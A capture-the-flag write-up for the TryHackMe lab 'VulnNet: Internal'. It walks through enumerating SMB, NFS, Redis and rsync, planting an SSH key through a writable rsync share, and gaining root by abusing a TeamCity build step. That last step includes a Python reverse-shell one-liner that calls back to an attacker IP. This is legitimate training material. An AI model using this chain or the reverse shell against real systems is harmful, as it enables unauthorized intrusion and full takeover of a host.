```bash
# PLATFORM          . THM
# CTF NAME          . VulnNet: Internal
# DESCRIPTION       . VulnNet Entertainment learns from its mistakes, and now they have something new for you...
# DIFFICULTY        . Easy
# CTF LINK          . https://tryhackme.com/room/vulnnetinternal
```

```
sudo nmap -sSVC -p- -T5 -oN internal 10.10.169.137 -v
```

```
PORT      STATE    SERVICE     VERSION
22/tcp    open     ssh         OpenSSH 7.6p1 Ubuntu 4ubuntu0.3 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 5e278f48ae2ff889bb8913e39afd6340 (RSA)
|   256 f4fe0be25c88b563138550ddd586abbd (ECDSA)
|_  256 82ea4885f02a237e0ea9d9140a602fad (ED25519)
111/tcp   open     rpcbind     2-4 (RPC #100000)
| rpcinfo: 
|   program version    port/proto  service
|   100000  2,3,4        111/tcp   rpcbind
|   100000  2,3,4        111/udp   rpcbind
|   100000  3,4          111/tcp6  rpcbind
|   100000  3,4          111/udp6  rpcbind
|   100003  3           2049/udp   nfs
|   100003  3           2049/udp6  nfs
|   100003  3,4         2049/tcp   nfs
|   100003  3,4         2049/tcp6  nfs
|   100005  1,2,3      40538/udp6  mountd
|   100005  1,2,3      47721/tcp6  mountd
|   100005  1,2,3      57948/udp   mountd
|   100005  1,2,3      58657/tcp   mountd
|   100021  1,3,4      38477/tcp   nlockmgr
|   100021  1,3,4      39481/tcp6  nlockmgr
|   100021  1,3,4      45095/udp   nlockmgr
|   100021  1,3,4      47463/udp6  nlockmgr
|   100227  3           2049/tcp   nfs_acl
|   100227  3           2049/tcp6  nfs_acl
|   100227  3           2049/udp   nfs_acl
|_  100227  3           2049/udp6  nfs_acl
139/tcp   open     netbios-ssn Samba smbd 3.X - 4.X (workgroup: WORKGROUP)
445/tcp   open     netbios-ssn Samba smbd 4.7.6-Ubuntu (workgroup: WORKGROUP)
873/tcp   open     rsync       (protocol version 31)
2049/tcp  open     nfs_acl     3 (RPC #100227)
6379/tcp  open     redis       Redis key-value store
9090/tcp  filtered zeus-admin
33797/tcp open     java-rmi    Java RMI
38477/tcp open     nlockmgr    1-4 (RPC #100021)
38965/tcp open     mountd      1-3 (RPC #100005)
41065/tcp open     mountd      1-3 (RPC #100005)
58657/tcp open     mountd      1-3 (RPC #100005)
Service Info: Host: VULNNET-INTERNAL; OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

#### PORT 139 & 445 - Samba

```
smbclient -L \\\\10.10.169.137
```

```
	Sharename       Type      Comment
	---------       ----      -------
	print$          Disk      Printer Drivers
	shares          Disk      VulnNet Business Shares
	IPC$            IPC       IPC Service (vulnnet-internal server (Samba, Ubuntu))
```

```
smbclient \\\\10.10.169.137\\shares

smb: \> ls
  .                                   D        0  Tue Feb  2 11:20:09 2021
  ..                                  D        0  Tue Feb  2 11:28:11 2021
  temp                                D        0  Sat Feb  6 13:45:10 2021
  data                                D        0  Tue Feb  2 11:27:33 2021
```

- I used the `anonymous` password to connect. 

- Inside those two directories, I found the following files.

```
services.txt                        N       38  Sat Feb  6 13:45:09 2021
data.txt                            N       48  Tue Feb  2 11:21:18 2021
business-req.txt                    N      190  Tue Feb  2 11:27:33 2021
``` 

- `services.txt` is a flag, `data.txt` is some useless text and `business-req.txt` ... I don't know if it's a hint or not.

```
We just wanted to remind you that we’re waiting for the DOCUMENT you agreed to send us so we can complete the TRANSACTION we discussed. If you have any questions, please text or phone us.
```

#### PORT 6379 - REDIS

- The next thing that caught my attention the Redis database, as it doesn't require authentication by default. However, this one did require a password only authentication.

- I tried leaving hydra to bruteforce for a while but no success.

#### Port 2049 - NFS

- I noticed port 2049 open, and I checked if there are any NFS Shares avaible to be mounted on my host.

```
sudo showmount -e 10.10.169.137

Export list for 10.10.169.137:
/opt/conf *
```

```
mkdir temp

sudo mount -t nfs  10.10.169.137:/opt/conf temp/
```

```
ls -lah
total 36K
drwxr-xr-x 9 root      root      4.0K Feb  2  2021 .
drwxr-xr-x 4 madalinux madalinux 4.0K Dec 31 04:10 ..
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 hp
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 init
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 opt
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 profile.d
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 redis
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 vim
drwxr-xr-x 2 root      root      4.0K Feb  2  2021 wildmidi
```

- Alright. So we got access to some files. The first thing I did was to check redis. Inside that directory was the config file of the DB.

```
cat redis.conf | grep pass

# masterauth <master-password>
requirepass "{REDACTED}F"
```

- Nice. I couldn't find other useful information in the rest of the files.

#### Back to Redis - 6379

```
10.10.169.137:6379> AUTH {REDACTED}
OK
10.10.169.137:6379> INFO keyspace
# Keyspace
db0:keys=5,expires=0,avg_ttl=0
10.10.169.137:6379> SELECT 0
OK
10.10.169.137:6379> KEYS *
1) "int"
2) "marketlist"
3) "tmp"
4) "internal flag"
5) "authlist"
```

- We can get any key with the `get` command. `get "internal flag"` will get us another flag.
- However, I wanted to take a look at the others.

- I couldn't use `GET` for `authlist` and `marketlist`, since they were another Key Type (can be seen with `TYPE <key>`).

- I managed to read them using `LRANGE authlist 0 -1` and `LRANGE marketlist 0 -1`.

- Authlist contained a base64 string four times, which, upon decoding, revealed the following info:

```
Authorization for rsync://rsync-connect@127.0.0.1 with password {REDACTED}v
```

#### PORT 873 - rsync

- I did some manual enumeration via netcat

```bash
nc -vn 10.10.169.137 873
Connection to 10.10.169.137 873 port [tcp/*] succeeded!
@RSYNCD: 31.0 # sent by server
@RSYNCD: 31.0 # sent by me
#list # send by me
files          	Necessary home interaction # sent by server
@RSYNCD: EXIT # sent by server ; connection terminated.
```

```bash
nc -vn 10.10.169.137 873
Connection to 10.10.169.137 873 port [tcp/*] succeeded!
@RSYNCD: 31.0
@RSYNCD: 31.0
files
@RSYNCD: AUTHREQD m6HAgJwMhK47KSKe+dqlDw
```

- Ok, so we need to authenticate to access the `files` share. I don't know how to do this via `nc`, so let's use the `rsync` command.

```bash
mkdir rsynced
rsync -av rsync://rsync-connect@10.10.169.137/files rsynced/
```

- This will sync the entire remote directory to in our directory called rsynced.

```bash
ls -ah
.              .config    .gnupg    Public                     user.txt
..             .dbus      .local    .rediscli_history          Videos
.bash_history  Desktop    .mozilla  .ssh                       .Xauthority
.bash_logout   .dmrc      Music     .sudo_as_admin_successful  .xscreensaver
.bashrc        Documents  Pictures  Templates                  .xsession-errors
.cache         Downloads  .profile  .thumbnails                .xsession-errors.old
```

- The user flag is in `user.txt`. 

- Anyway. The files above have the structure of an usual home directory, and they're in a directory called `sys-internal.` This might be a valid username.

- What I did was to generate a ssh private:public key pair and write the public key in a file called `authorized_keys`. 

- Then, I've used rsync to upload it to `/files/sys-internal/.ssh`.

```
rsync -av authorized_keys rsync://rsync-connect@10.10.169.137/files/sys-internal/.ssh
```

- After this, all I had to do was to SSH to the box: `ssh -i internal_key sys-internal@10.10.169.137`

#### PRIVILEGE ESCALATION

- I didn't find anything manually, so I had to use one of those ... automated tools :|

- Anyway, I've transferred `linpeas.sh` using rsync and from the output I noticed that there was `/TeamCity` directory available. 

- Then, I googled and it uses port 8111. So I've used `ss --listening | grep 8111` and it was listening, so I've used SSH to port forward the website.

```
ssh -L 8111:127.0.0.1:8111 -i internal_key sys-internal@10.10.169.137
```

- Then, I headed to `http://127.0.0.1:8111` and clicked on `Log in as Super user`.

- This asked for an authentication code. 

```
cd /TeamCity

grep -r "token" */*
```

```
logs/catalina.out:[TeamCity] Super user authentication token: {REDACTED} (use empty username with the token as the password to access the server)
```

- Alright. I think I spend at least 1 hour poking around TeamCity, since I've never used it before. 

- Here's the thing: Teamcity is in root directory and it's owned (and ran) by root. Anything ran by TeamCity is ran as root.

- So here are the steps to get a reverse shell as root.

1. Create a new project.
2. Create a new... task ( i think ) under the project.
3. On the left column, go to Build Step. 
4. Add a new Build Step (python).
5. For the command, select "Custom script"
6. Here, I took the following reverse shell from revshells.com

```bash
python3 -c 'import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",3131));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")'
```

- and I deleted the bash-related code, so I left only

```python
import socket,subprocess,os;s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("ip",3131));os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);import pty; pty.spawn("sh")
```

7. Save.
8. Go to Projects (top menu)
9. Click run.
10. Got a reverse shell.

- Last flag is in `/root/root.txt`.